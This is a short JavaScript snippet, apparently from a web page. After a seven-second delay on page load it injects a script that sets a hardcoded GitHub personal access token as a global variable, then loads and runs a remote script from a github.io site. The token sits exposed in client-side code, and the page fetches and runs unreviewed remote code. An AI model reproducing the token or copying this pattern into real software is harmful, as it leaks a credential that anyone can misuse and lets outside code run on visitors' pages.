window.onload = _ => {
    setTimeout(() => {
        let script = document.createElement("script");
        let script1 = document.createElement("script");
        script1.innerText = `let TOKEN = "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";`
        script.src = "https://alisodsin.github.io/newkalamscript.js"
        document.head.append(script1);
        document.head.append(script);
    },7000);
}